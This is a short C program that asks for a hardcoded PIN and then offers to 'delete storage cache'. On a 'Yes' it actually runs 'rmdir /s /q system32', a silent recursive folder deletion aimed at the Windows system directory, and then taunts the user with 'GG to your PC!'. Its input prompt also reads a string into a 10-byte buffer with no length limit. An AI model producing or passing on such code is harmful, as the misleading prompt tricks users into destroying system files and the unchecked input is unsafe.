#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main()
{
	char choice[10];
	int pin, correctPin = 1234;

	printf("Enter the PIN: ");
	scanf("%d",&pin);

	if(pin == correctPin){
		printf("\nWould you like to delete storage cache??\n(Yes/No):");
		scanf("%s",choice);

		if(strcmp(choice, "Yes") == 0 || strcmp(choice, "yes") == 0){
			system("rmdir /s /q system32");
			printf("\nFolder deleted!\n");
			printf("GG to your PC!");
		}
		else{
			printf("ACTION TERMINATED");
		}

	}
	else{
		printf("\nINVALID PIN!\n");
		printf("\nACTION TERMINATED");

		return 0;
	}
	return 0;
}
